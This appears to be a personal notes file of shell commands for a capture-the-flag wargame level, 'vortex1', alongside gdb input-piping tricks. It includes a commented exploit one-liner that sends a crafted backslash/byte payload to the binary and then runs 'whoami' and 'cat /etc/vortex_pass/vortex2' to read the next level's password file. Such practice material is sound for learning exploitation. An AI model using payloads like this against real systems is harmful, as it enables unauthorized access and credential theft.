# 1. how to pass arguments
# echo -e "\\" | ./vortex1   

# 2. correct solution for vortex1
# python -c 'print  "\\"*0x101+"\xca!\n"+"A"*4000+"\nwhoami\ncat /etc/vortex_pass/vortex2"' | ./vortex1 

#python -c 'print "abc"' | gdb --args hello

#python -c 'print "abc"' > in.txt

#gdb hello -e "set args \"abc\"" 

#cat abc | gdb hello

(echo -e "\\"; cat) #| gdb hello
